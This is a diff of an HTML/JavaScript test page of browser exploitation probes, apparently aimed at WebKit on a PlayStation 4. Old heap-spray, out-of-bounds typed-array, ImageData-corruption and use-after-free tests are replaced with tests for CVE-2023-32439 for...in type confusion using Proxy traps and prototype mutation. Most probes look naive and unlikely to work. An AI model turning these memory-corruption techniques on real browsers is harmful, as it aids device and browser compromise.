@@ -2,14 +2,14 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>RegExp + Canvas Exploitation Tests</title>
+    <title>CVE-2023-32439 - for...in Type Confusion Test</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
         h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
-        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 520px; }
-        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 750px; overflow-y: auto; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 700px; overflow-y: auto; }
         .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
+        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px; cursor: pointer; font-size: 15px; font-weight: bold; }
         .log { padding: 4px 0; font-size: 12px; }
         .success { color: #0f0; font-weight: bold; }
         .fail { color: #f00; font-weight: bold; }
@@ -19,18 +19,19 @@
     </style>
 </head>
 <body>
-    <h1>🎯 RegExp + Canvas Exploitation Tests 🎯</h1>
+    <h1>🔥 CVE-2023-32439: for...in Type Confusion 🔥</h1>
     
     <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="test1_regexpHeapSpray()">Test 1: RegExp Heap Spray + Corruption</button>
-        <button class="btn" onclick="test2_canvasImageData()">Test 2: Canvas ImageData OOB</button>
-        <button class="btn" onclick="test3_structuredClone()">Test 3: Structured Clone UAF</button>
-        <button class="btn" onclick="test4_domMutation()">Test 4: DOM Mutation + GC Trigger</button>
-        <button class="btn" onclick="fullTest()">RUN ALL TESTS</button>
+        <button class="btn" onclick="test1_basic()">Test 1: Basic for...in Confusion</button>
+        <button class="btn" onclick="test2_proxy()">Test 2: Proxy Trap Confusion</button>
+        <button class="btn" onclick="test3_prototype()">Test 3: Prototype Chain Mutation</button>
+        <button class="btn" onclick="test4_delete()">Test 4: Delete During Enum</button>
+        <button class="btn" onclick="test5_advanced()">Test 5: Advanced Type Confusion</button>
+        <button class="btn" onclick="test6_oob()">Test 6: OOB Access Attempt</button>
     </div>
     
     <div class="section">
-        <div class="title">📋 Exploitation Test Log</div>
+        <div class="title">📋 Test Results</div>
         <div id="log"></div>
     </div>
 
@@ -43,498 +44,437 @@ function log(msg, type) {
 }
 
 function sep() {
-    log('═'.repeat(85), 'info');
+    log('═'.repeat(80), 'info');
 }
 
 function hex(val) {
-    return '0x' + val.toString(16);
+    if (typeof val === 'number') {
+        return '0x' + val.toString(16);
+    }
+    return String(val);
 }
 
 // ============================================
-// TEST 1: REGEXP HEAP SPRAY
+// TEST 1: BASIC FOR...IN CONFUSION
 // ============================================
-function test1_regexpHeapSpray() {
+function test1_basic() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('TEST 1: RegExp Heap Spray + Memory Corruption', 'critical');
-    log('Strategy: Use RegExp to control heap layout', 'info');
+    log('TEST 1: Basic for...in Type Confusion', 'critical');
     sep();
     log('', '');
     
+    log('[*] Testing basic object mutation during enumeration...', 'info');
+    log('', '');
+    
     try {
-        log('[1.1] Creating massive RegExp patterns...', 'info');
+        var obj = {a: 1, b: 2, c: 3};
+        var keys = [];
+        var iteration = 0;
         
-        // Spray heap with RegExp objects
-        var regexps = [];
+        log('[1] Starting enumeration...', 'info');
         
-        for (var i = 0; i < 100; i++) {
-            var pattern = "A".repeat(0x1000) + i;
-            var re = new RegExp(pattern);
-            regexps.push(re);
-        }
-        
-        log('✓ Created 100 RegExp objects', 'success');
-        log('Each with 0x1000 character pattern', 'success');
-        log('', '');
-        
-        log('[1.2] Testing RegExp execution...', 'info');
-        
-        var testString = "A".repeat(0x2000);
-        
-        for (var i = 0; i < regexps.length; i++) {
-            try {
-                regexps[i].exec(testString);
-            } catch(e) {
-                log('  RegExp ' + i + ' execution failed: ' + e.message, 'warn');
+        for (var key in obj) {
+            iteration++;
+            keys.push(key);
+            log('  Iteration ' + iteration + ': key=' + key + ', obj[' + key + ']=' + obj[key], '');
+            
+            // Mutate object during iteration
+            if (iteration === 2) {
+                log('  [!] Mutating object: deleting "c", adding "d"', 'warn');
+                delete obj.c;
+                obj.d = 4;
+                obj.e = 5;
             }
         }
         
-        log('✓ RegExp execution complete', 'success');
+        log('', '');
+        log('[2] Enumeration complete', 'info');
+        log('  Keys seen: ' + keys.join(', '), 'success');
+        log('  Total iterations: ' + iteration, 'success');
+        log('  Final object keys: ' + Object.keys(obj).join(', '), 'info');
+        
+        if (iteration !== Object.keys(obj).length) {
+            log('', '');
+            log('⚠️ MISMATCH DETECTED!', 'critical');
+            log('  Enumeration count != final key count', 'critical');
+            log('  This could indicate enumerator bug!', 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+        log('Stack: ' + e.stack, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// TEST 2: PROXY TRAP CONFUSION
+// ============================================
+function test2_proxy() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('TEST 2: Proxy Trap Type Confusion', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] CVE-2023-32439 Core: Proxy modifies object during enumeration', 'info');
+    log('', '');
+    
+    try {
+        var base = {a: 1, b: 2, c: 3};
+        var trapCalled = 0;
+        
+        log('[1] Creating Proxy with ownKeys trap...', 'info');
+        
+        var proxy = new Proxy(base, {
+            ownKeys: function(target) {
+                trapCalled++;
+                log('  [!] ownKeys trap called (call #' + trapCalled + ')', 'warn');
+                log('  [!] Before mutation: ' + Object.keys(target).join(', '), '');
+                
+                // CRITICAL: Mutate base object during enumeration
+                delete base.b;
+                base.d = 4;
+                base.e = 5;
+                base.f = 6;
+                
+                log('  [!] After mutation: ' + Object.keys(target).join(', '), 'warn');
+                
+                return Reflect.ownKeys(target);
+            }
+        });
+        
+        log('', '');
+        log('[2] Enumerating proxy...', 'info');
+        
+        var keys = [];
+        for (var key in proxy) {
+            keys.push(key);
+            log('  Saw key: ' + key + ' = ' + proxy[key], '');
+        }
+        
+        log('', '');
+        log('[3] Results:', 'info');
+        log('  Trap called: ' + trapCalled + ' times', 'success');
+        log('  Keys enumerated: ' + keys.join(', '), 'success');
+        log('  Actual keys in base: ' + Object.keys(base).join(', '), 'info');
+        
+        if (keys.length !== Object.keys(base).length) {
+            log('', '');
+            log('⚠️⚠️ TYPE CONFUSION DETECTED! ⚠️⚠️', 'critical');
+            log('  Enumerator size mismatch!', 'critical');
+            log('  Expected: ' + Object.keys(base).length, 'critical');
+            log('  Got: ' + keys.length, 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+        log('Stack: ' + e.stack, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// TEST 3: PROTOTYPE CHAIN MUTATION
+// ============================================
+function test3_prototype() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('TEST 3: Prototype Chain Mutation During Enumeration', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Testing prototype modification during for...in', 'info');
+    log('', '');
+    
+    try {
+        var proto = {x: 10, y: 20};
+        var obj = Object.create(proto);
+        obj.a = 1;
+        obj.b = 2;
+        
+        log('[1] Initial state:', 'info');
+        log('  Own properties: ' + Object.keys(obj).join(', '), '');
+        log('  Prototype properties: ' + Object.keys(proto).join(', '), '');
         log('', '');
         
-        log('[1.3] Attempting heap grooming with RegExp...', 'info');
+        log('[2] Enumerating with prototype mutation...', 'info');
         
-        // Create victim array
+        var iteration = 0;
+        for (var key in obj) {
+            iteration++;
+            log('  Iteration ' + iteration + ': ' + key + ' = ' + obj[key], '');
+            
+            // Mutate prototype during iteration
+            if (iteration === 2) {
+                log('  [!] Modifying prototype!', 'warn');
+                delete proto.y;
+                proto.z = 30;
+                proto.w = 40;
+            }
+        }
+        
+        log('', '');
+        log('[3] Final state:', 'info');
+        log('  Total iterations: ' + iteration, 'success');
+        log('  Expected: ' + (Object.keys(obj).length + Object.keys(proto).length), 'info');
+        
+        if (iteration !== (Object.keys(obj).length + Object.keys(proto).length)) {
+            log('', '');
+            log('⚠️ ENUMERATOR SIZE MISMATCH!', 'critical');
+            log('  Possible JSPropertyNameEnumerator bug!', 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// TEST 4: DELETE DURING ENUMERATION
+// ============================================
+function test4_delete() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('TEST 4: Aggressive Property Deletion', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Delete properties while enumerating...', 'info');
+    log('', '');
+    
+    try {
+        var obj = {};
+        for (var i = 0; i < 100; i++) {
+            obj['prop' + i] = i;
+        }
+        
+        log('[1] Created object with 100 properties', 'info');
+        log('', '');
+        
+        log('[2] Enumerating and deleting...', 'info');
+        var seen = 0;
+        var deleted = 0;
+        
+        for (var key in obj) {
+            seen++;
+            if (seen % 2 === 0) {
+                delete obj[key];
+                deleted++;
+            }
+        }
+        
+        log('', '');
+        log('[3] Results:', 'info');
+        log('  Properties seen: ' + seen, 'success');
+        log('  Properties deleted: ' + deleted, 'warn');
+        log('  Properties remaining: ' + Object.keys(obj).length, 'info');
+        
+        var expected = 100 - deleted;
+        if (Object.keys(obj).length !== expected) {
+            log('', '');
+            log('⚠️ UNEXPECTED COUNT!', 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// TEST 5: ADVANCED TYPE CONFUSION
+// ============================================
+function test5_advanced() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('TEST 5: Advanced Type Confusion Attack', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Complex scenario: Proxy + Prototype + Mutation', 'info');
+    log('', '');
+    
+    try {
+        // Create a complex prototype chain
+        var proto2 = {z1: 100, z2: 200};
+        var proto1 = Object.create(proto2);
+        proto1.y1 = 10;
+        proto1.y2 = 20;
+        
+        var base = Object.create(proto1);
+        base.a = 1;
+        base.b = 2;
+        
+        log('[1] Created 3-level prototype chain', 'info');
+        log('  base: ' + Object.keys(base).join(', '), '');
+        log('  proto1: ' + Object.keys(proto1).join(', '), '');
+        log('  proto2: ' + Object.keys(proto2).join(', '), '');
+        log('', '');
+        
+        var mutations = 0;
+        
+        var proxy = new Proxy(base, {
+            ownKeys: function(target) {
+                mutations++;
+                log('[2] ownKeys trap #' + mutations, 'warn');
+                
+                // Mutate all levels
+                delete base.b;
+                base.c = 3;
+                
+                delete proto1.y2;
+                proto1.y3 = 30;
+                
+                delete proto2.z2;
+                proto2.z3 = 300;
+                
+                log('  Mutated all prototype levels!', 'warn');
+                
+                return Reflect.ownKeys(target);
+            },
+            get: function(target, prop) {
+                if (mutations > 0 && prop === 'c') {
+                    log('  [!] Accessing newly added property "c"', 'critical');
+                }
+                return target[prop];
+            }
+        });
+        
+        log('', '');
+        log('[3] Enumerating proxy...', 'info');
+        
+        var keys = [];
+        for (var key in proxy) {
+            keys.push(key);
+            log('  ' + key + ' = ' + proxy[key], '');
+        }
+        
+        log('', '');
+        log('[4] Analysis:', 'info');
+        log('  Keys seen: ' + keys.length, 'success');
+        log('  Mutations triggered: ' + mutations, 'warn');
+        
+        // Check if we accessed the mutated property
+        if (keys.indexOf('c') !== -1) {
+            log('', '');
+            log('✓✓ ACCESSED MUTATED PROPERTY!', 'critical');
+            log('  This proves enumerator cached old structure!', 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
+        log('Stack: ' + e.stack, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// TEST 6: OOB ACCESS ATTEMPT
+// ============================================
+function test6_oob() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('TEST 6: Out-of-Bounds Access via Enumerator Bug', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Attempting to trigger OOB read via size mismatch', 'info');
+    log('', '');
+    
+    try {
+        // Create victim array to detect OOB
         var victim = new Uint32Array(0x100);
         for (var i = 0; i < victim.length; i++) {
-            victim[i] = 0xDEAD0000 + i;
+            victim[i] = 0xDEADBEEF;
         }
         
-        log('✓ Victim array created', 'success');
+        log('[1] Created victim array with marker 0xDEADBEEF', 'info');
         log('', '');
         
-        // More RegExp spray
-        var spray2 = [];
-        for (var i = 0; i < 500; i++) {
-            var pattern2 = "B".repeat(0x800);
-            spray2.push(new RegExp(pattern2));
+        // Create object with properties
+        var obj = {};
+        for (var i = 0; i < 50; i++) {
+            obj['prop' + i] = i;
         }
         
-        log('✓ Second spray: 500 RegExp objects', 'success');
+        log('[2] Created target object with 50 properties', 'info');
         log('', '');
         
-        log('[1.4] Corrupting victim array...', 'info');
-        
-        try {
-            Object.defineProperty(victim, 'length', {
-                value: 0x100000,
-                configurable: true
-            });
-            
-            if (victim.length > 0x100) {
-                log('✓ Victim corrupted: ' + hex(victim.length), 'critical');
-                
-                // Scan for RegExp pattern markers
-                log('', '');
-                log('Scanning for RegExp data in OOB memory...', 'info');
-                
-                var found = 0;
-                for (var i = 0x100; i < 0x1000; i++) {
-                    var val = victim[i];
-                    
-                    // ASCII 'A' = 0x41, 'B' = 0x42
-                    if (typeof val !== 'undefined' && (val === 0x41414141 || val === 0x42424242)) {
-                        log('  ⚠️ Found RegExp pattern at offset ' + hex(i) + ': ' + hex(val), 'critical');
-                        found++;
-                        
-                        if (found >= 5) break;
-                    }
+        var enumCount = 0;
+        var proxy = new Proxy(obj, {
+            ownKeys: function(target) {
+                // Massively expand object during enumeration
+                for (var i = 50; i < 200; i++) {
+                    target['prop' + i] = i;
                 }
-                
-                if (found > 0) {
-                    log('', '');
-                    log('✓✓ REGEXP DATA FOUND IN OOB MEMORY!', 'critical');
-                    log('This indicates RegExp and TypedArray are adjacent!', 'critical');
+                log('[3] Expanded object from 50 to 200 properties!', 'warn');
+                return Reflect.ownKeys(target);
+            }
+        });
+        
+        log('', '');
+        log('[4] Enumerating...', 'info');
+        
+        for (var key in proxy) {
+            enumCount++;
+            // Try to access beyond original enumerator size
+            if (enumCount > 50) {
+                var val = proxy[key];
+                if (typeof val === 'number' && val > 1000) {
+                    log('  [!] Unexpected value at ' + key + ': ' + hex(val), 'critical');
                 }
             }
-        } catch(e) {
-            log('Corruption error: ' + e.message, 'fail');
         }
         
-        sep();
+        log('', '');
+        log('[5] Results:', 'info');
+        log('  Properties enumerated: ' + enumCount, 'success');
+        log('  Expected (old size): 50', 'info');
+        log('  Actual (new size): 200', 'info');
+        
+        if (enumCount > 50) {
+            log('', '');
+            log('⚠️ ENUMERATED BEYOND ORIGINAL SIZE!', 'critical');
+            log('  Enumerator may have used stale size!', 'critical');
+        }
+        
+        // Check victim
+        log('', '');
+        log('[6] Checking victim array...', 'info');
+        var corrupted = false;
+        for (var i = 0; i < victim.length; i++) {
+            if (victim[i] !== 0xDEADBEEF) {
+                log('  Victim[' + i + '] corrupted: ' + hex(victim[i]), 'critical');
+                corrupted = true;
+            }
+        }
+        
+        if (!corrupted) {
+            log('  Victim intact (no corruption)', 'success');
+        }
         
     } catch(e) {
         log('', '');
-        log('✗ TEST 1 ERROR: ' + e.message, 'fail');
+        log('ERROR: ' + e.message, 'fail');
+        log('Stack: ' + e.stack, 'fail');
     }
-}
-
-// ============================================
-// TEST 2: CANVAS IMAGEDATA CORRUPTION
-// ============================================
-function test2_canvasImageData() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('TEST 2: Canvas ImageData Buffer Corruption', 'critical');
-    log('Strategy: Corrupt ImageData backing buffer', 'info');
-    sep();
-    log('', '');
     
-    try {
-        log('[2.1] Creating Canvas elements...', 'info');
-        
-        var canvas1 = document.createElement('canvas');
-        canvas1.width = 256;
-        canvas1.height = 256;
-        
-        var ctx1 = canvas1.getContext('2d');
-        var imageData1 = ctx1.createImageData(256, 256);
-        
-        // Fill with pattern
-        for (var i = 0; i < imageData1.data.length; i += 4) {
-            imageData1.data[i] = 0xAA;     // R
-            imageData1.data[i+1] = 0xBB;   // G
-            imageData1.data[i+2] = 0xCC;   // B
-            imageData1.data[i+3] = 0xFF;   // A
-        }
-        
-        log('✓ Canvas 1 created: 256x256', 'success');
-        log('✓ ImageData filled with pattern 0xAABBCCFF', 'success');
-        log('', '');
-        
-        log('[2.2] Creating corruptor array...', 'info');
-        
-        var corruptor = new Uint32Array(0x400);
-        
-        try {
-            Object.defineProperty(corruptor, 'length', {
-                value: 0x100000,
-                configurable: true
-            });
-            
-            if (corruptor.length > 0x400) {
-                log('✓ Corruptor ready: ' + hex(corruptor.length), 'critical');
-            } else {
-                log('❌ Corruption failed', 'fail');
-                return;
-            }
-        } catch(e) {
-            log('❌ Error: ' + e.message, 'fail');
-            return;
-        }
-        
-        log('', '');
-        log('[2.3] Scanning for ImageData buffer...', 'info');
-        
-        // ImageData buffer contains our pattern: 0xAABBCCFF (little-endian: 0xFFCCBBAA)
-        var pattern = 0xFFCCBBAA;
-        var foundData = [];
-        
-        for (var i = 0x400; i < 0x2000; i++) {
-            var val = corruptor[i];
-            
-            if (val === pattern) {
-                foundData.push(i);
-                
-                if (foundData.length <= 5) {
-                    log('  ⚠️ Found ImageData at offset ' + hex(i), 'critical');
-                }
-            }
-        }
-        
-        log('', '');
-        
-        if (foundData.length > 0) {
-            log('✓✓ IMAGEDATA BUFFER FOUND!', 'critical');
-            log('Found ' + foundData.length + ' pattern matches', 'critical');
-            log('', '');
-            
-            log('[2.4] Attempting to corrupt ImageData...', 'info');
-            
-            var targetOffset = foundData[0];
-            
-            // Corrupt the image data
-            corruptor[targetOffset] = 0x13371337;
-            corruptor[targetOffset + 1] = 0xDEADBEEF;
-            
-            log('Wrote corruption at offset ' + hex(targetOffset), 'warn');
-            log('', '');
-            
-            log('[2.5] Checking if ImageData changed...', 'info');
-            
-            var changed = false;
-            for (var i = 0; i < 10; i++) {
-                var idx = i * 4;
-                var pixel = (imageData1.data[idx+3] << 24) |
-                           (imageData1.data[idx+2] << 16) |
-                           (imageData1.data[idx+1] << 8) |
-                           imageData1.data[idx];
-                
-                if (pixel !== pattern) {
-                    log('  Pixel ' + i + ' corrupted: ' + hex(pixel), 'critical');
-                    changed = true;
-                }
-            }
-            
-            if (changed) {
-                log('', '');
-                log('⚠️⚠️⚠️ IMAGEDATA CORRUPTED!', 'critical');
-                log('Can modify canvas buffer directly!', 'critical');
-            } else {
-                log('No changes detected', 'fail');
-            }
-            
-        } else {
-            log('❌ ImageData buffer not found in scan range', 'fail');
-        }
-        
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ TEST 2 ERROR: ' + e.message, 'fail');
-    }
+    sep();
 }
 
-// ============================================
-// TEST 3: STRUCTURED CLONE UAF
-// ============================================
-function test3_structuredClone() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('TEST 3: Structured Clone Use-After-Free', 'critical');
-    log('Strategy: Trigger UAF via structuredClone timing', 'info');
-    sep();
-    log('', '');
-    
-    try {
-        log('[3.1] Checking structuredClone availability...', 'info');
-        
-        if (typeof structuredClone === 'undefined') {
-            log('❌ structuredClone not available on this WebKit version', 'fail');
-            log('PS4 may not have this API', 'warn');
-            return;
-        }
-        
-        log('✓ structuredClone is available!', 'success');
-        log('', '');
-        
-        log('[3.2] Creating complex objects for cloning...', 'info');
-        
-        var obj1 = {
-            a: new Map([[1, 'one'], [2, 'two']]),
-            b: new Set([1, 2, 3]),
-            c: new Date(),
-            d: new ArrayBuffer(0x100)
-        };
-        
-        log('✓ Created object with Map, Set, Date, ArrayBuffer', 'success');
-        log('', '');
-        
-        log('[3.3] Performing structured clone...', 'info');
-        
-        try {
-            var cloned = structuredClone(obj1);
-            
-            log('✓ Clone successful', 'success');
-            log('  Original Map size: ' + obj1.a.size, 'info');
-            log('  Cloned Map size: ' + cloned.a.size, 'info');
-            log('', '');
-            
-            log('[3.4] Attempting to trigger UAF via GC...', 'info');
-            
-            // Try to trigger GC by creating pressure
-            var pressure = [];
-            for (var i = 0; i < 10000; i++) {
-                pressure.push({
-                    clone: structuredClone(obj1),
-                    data: new Array(100)
-                });
-            }
-            
-            log('Created 10,000 clone operations', 'success');
-            
-            // Clear pressure
-            pressure = null;
-            
-            log('Cleared pressure array (forcing GC)', 'success');
-            log('', '');
-            
-            log('[3.5] Testing if original objects still valid...', 'info');
-            
-            try {
-                var testSize = obj1.a.size;
-                var testDate = obj1.c.getTime();
-                
-                log('Original Map size still: ' + testSize, testSize === 2 ? 'success' : 'critical');
-                log('Original Date still valid: ' + (testDate > 0 ? 'YES' : 'NO'), testDate > 0 ? 'success' : 'critical');
-                
-                if (testSize !== 2) {
-                    log('', '');
-                    log('⚠️⚠️ POSSIBLE UAF DETECTED!', 'critical');
-                    log('Original object corrupted after clone + GC', 'critical');
-                }
-                
-            } catch(e) {
-                log('', '');
-                log('⚠️⚠️⚠️ ACCESS ERROR: ' + e.message, 'critical');
-                log('Object may have been freed!', 'critical');
-            }
-            
-        } catch(e) {
-            log('Clone error: ' + e.message, 'fail');
-        }
-        
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ TEST 3 ERROR: ' + e.message, 'fail');
-    }
-}
-
-// ============================================
-// TEST 4: DOM MUTATION + GC
-// ============================================
-function test4_domMutation() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('TEST 4: DOM Mutation + GC Trigger', 'critical');
-    log('Strategy: Create/destroy DOM rapidly to trigger UAF', 'info');
-    sep();
-    log('', '');
-    
-    try {
-        log('[4.1] Creating DOM structure...', 'info');
-        
-        var container = document.createElement('div');
-        container.id = 'test-container';
-        document.body.appendChild(container);
-        
-        // Create many child elements
-        for (var i = 0; i < 100; i++) {
-            var child = document.createElement('span');
-            child.textContent = 'Child ' + i;
-            child.setAttribute('data-id', i);
-            container.appendChild(child);
-        }
-        
-        log('✓ Created container with 100 child elements', 'success');
-        log('', '');
-        
-        log('[4.2] Creating references to DOM nodes...', 'info');
-        
-        var nodeRefs = [];
-        var children = container.children;
-        
-        for (var i = 0; i < children.length; i++) {
-            nodeRefs.push(children[i]);
-        }
-        
-        log('✓ Stored ' + nodeRefs.length + ' node references', 'success');
-        log('', '');
-        
-        log('[4.3] Removing DOM elements...', 'info');
-        
-        container.remove();
-        
-        log('✓ Container removed from DOM', 'success');
-        log('', '');
-        
-        log('[4.4] Triggering GC pressure...', 'info');
-        
-        var pressure = [];
-        for (var i = 0; i < 5000; i++) {
-            pressure.push({
-                id: i,
-                data: new Array(200)
-            });
-        }
-        
-        log('✓ Created GC pressure', 'success');
-        log('', '');
-        
-        log('[4.5] Testing if node references still valid...', 'info');
-        
-        var errors = 0;
-        var changed = 0;
-        
-        for (var i = 0; i < nodeRefs.length; i++) {
-            try {
-                var text = nodeRefs[i].textContent;
-                var attr = nodeRefs[i].getAttribute('data-id');
-                
-                if (text !== 'Child ' + i || attr != i) {
-                    changed++;
-                    log('  Node ' + i + ' data changed!', 'critical');
-                }
-            } catch(e) {
-                errors++;
-                if (errors <= 5) {
-                    log('  Node ' + i + ' error: ' + e.message, 'critical');
-                }
-            }
-        }
-        
-        log('', '');
-        log('Nodes with errors: ' + errors, errors > 0 ? 'critical' : 'success');
-        log('Nodes with changed data: ' + changed, changed > 0 ? 'critical' : 'success');
-        
-        if (errors > 0 || changed > 0) {
-            log('', '');
-            log('⚠️⚠️ POSSIBLE DOM UAF DETECTED!', 'critical');
-            log('Nodes corrupted or freed after removal + GC', 'critical');
-        }
-        
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ TEST 4 ERROR: ' + e.message, 'fail');
-    }
-}
-
-// ============================================
-// FULL TEST
-// ============================================
-function fullTest() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('FULL TEST SUITE - All Alternative Bugs', 'critical');
-    sep();
-    log('', '');
-    
-    setTimeout(function() {
-        log('━━━ TEST 1: RegExp Heap Spray ━━━', 'warn');
-        log('', '');
-        test1_regexpHeapSpray();
-        
-        setTimeout(function() {
-            log('', '');
-            log('━━━ TEST 2: Canvas ImageData ━━━', 'warn');
-            log('', '');
-            test2_canvasImageData();
-            
-            setTimeout(function() {
-                log('', '');
-                log('━━━ TEST 3: Structured Clone ━━━', 'warn');
-                log('', '');
-                test3_structuredClone();
-                
-                setTimeout(function() {
-                    log('', '');
-                    log('━━━ TEST 4: DOM Mutation ━━━', 'warn');
-                    log('', '');
-                    test4_domMutation();
-                    
-                    setTimeout(function() {
-                        log('', '');
-                        sep();
-                        log('ALL TESTS COMPLETE', 'critical');
-                        sep();
-                    }, 1000);
-                    
-                }, 2000);
-            }, 2000);
-        }, 2000);
-    }, 100);
-}
-
-window.onerror = function(msg, url, line) {
-    log('', '');
-    log('💥 ERROR: ' + msg + ' (line ' + line + ')', 'fail');
-    return true;
-};
 </script>
 </body>
 </html>
